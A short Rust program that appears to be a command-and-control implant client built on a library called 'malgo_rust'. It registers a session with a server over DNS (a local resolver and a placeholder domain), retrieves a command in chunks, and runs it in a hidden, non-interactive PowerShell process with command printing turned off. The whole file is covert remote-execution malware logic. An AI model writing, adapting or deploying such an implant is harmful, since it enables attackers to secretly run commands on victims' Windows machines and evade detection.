use std::string::ToString;
use malgo_rust::session::Session;
use malgo_rust::transport::dns::*;
use malgo_rust::transport::Transport;

use powershell_script::PsScriptBuilder;

fn main() {
    let session: Session = Session {
        id: String::from("336df889-c0e9-453a-8675-8bff4176e1b0"),
        project_id: String::from("38b6d3a1-4373-4202-b9d7-b11d399d0ebf")
    };

    let dns = DNS::new("127.0.0.1:53".to_string(), "a.example.com".to_string(), session);

    match dns.register_session() {
        Ok(_) => println!("Session registered successfully"),
        Err(e) => println!("Error registering session: {}", e),
    }

    match dns.command_info() {
        Ok(resp) => {
            match resp {
                Some(mut r) => {
                    let mut done = false;
                    let mut offset = 0u64;
                    while !done {
                        match dns.command_details(&mut r, &mut offset) {
                            Ok(last) => {
                                if last {
                                    done = true
                                }
                            },
                            Err(_) => {}
                        }
                    }
                    println!("Command: {}", r.command);
                    // TODO: change to custom PsScriptBuilder
                    let ps = PsScriptBuilder::new()
                        .no_profile(true)
                        .non_interactive(true)
                        .hidden(true)
                        .print_commands(false)
                        .build();
                    let output = ps.run(r.command.as_str()).unwrap();
                    dbg!(output);
                },
                None => {}
            }
        },
        Err(e) => println!("Error querying for info: {}", e)
    }
}
